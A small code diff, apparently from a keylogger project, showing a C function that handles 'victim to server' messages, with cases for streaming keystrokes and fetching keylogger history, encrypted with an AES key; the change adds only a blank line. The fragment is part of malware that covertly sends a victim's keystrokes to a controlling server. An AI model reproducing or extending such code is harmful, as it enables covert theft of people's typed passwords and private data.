@@ -44,6 +44,7 @@ void V_2_S_encrypted_message_handler(main_data data, action_type action){ // vic
 	switch (action) {
 		case GET_KEYSTROKES_STREAM :
 			strcpy(encrypted_message.data.keylogger_stream_key, encrypt_text(data.keylogger_stream_key, AES_KEY));
+			
 			break;
 			
 		case GET_KEYLOGGER_HISTORY :
